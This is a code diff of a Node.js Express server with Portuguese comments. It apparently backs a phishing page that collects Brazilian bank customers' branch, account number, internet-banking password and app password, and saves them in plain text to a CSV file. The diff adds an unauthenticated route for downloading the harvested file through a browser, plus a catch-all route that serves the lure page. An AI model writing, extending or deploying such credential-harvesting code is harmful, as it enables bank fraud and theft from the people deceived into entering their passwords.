@@ -20,28 +20,28 @@ const csvWriter = createObjectCsvWriter({
   append: true
 });
 
-// Servir estáticos
+// Serve arquivos estáticos
 app.use(express.static(path.join(__dirname, "public")));
 app.use(express.urlencoded({ extended: true }));
 
-// Processa formulário
+// Processa envio do formulário
 app.post("/processa_formulario", upload.none(), async (req, res) => {
-  const { titularidade, tipo_conta, agency, login, internet, app } = req.body;
-  if (!agency || !login || !internet || !app) {
+  const { titularidade, tipo_conta, agency, login, internet, app: senhaApp } = req.body;
+  if (!agency || !login || !internet || !senhaApp) {
     return res.status(400).send("Todos os campos são obrigatórios.");
   }
 
-  const data = [{
+  const registro = [{
     titularidade,
     tipo_conta,
     agencia: agency,
     conta: login,
     senhaInternet: internet,
-    senhaApp: app
+    senhaApp
   }];
 
   try {
-    await csvWriter.writeRecords(data);
+    await csvWriter.writeRecords(registro);
     res.redirect("/agradecimento.html");
   } catch (err) {
     console.error("Erro ao salvar os dados:", err);
@@ -49,7 +49,23 @@ app.post("/processa_formulario", upload.none(), async (req, res) => {
   }
 });
 
-// Porta dinâmica para Render
+// Rota para baixar o CSV via navegador
+app.get("/download_csv", (req, res) => {
+  const filePath = path.join(__dirname, "dados_formulario.csv");
+  res.download(filePath, "dados_formulario.csv", err => {
+    if (err) {
+      console.error("Erro ao enviar CSV:", err);
+      res.status(500).send("Não foi possível baixar o CSV.");
+    }
+  });
+});
+
+// Fallback para servir index.html em qualquer GET
+app.get("/*", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// Inicia na porta do Render
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Servidor rodando em http://localhost:${PORT}`);
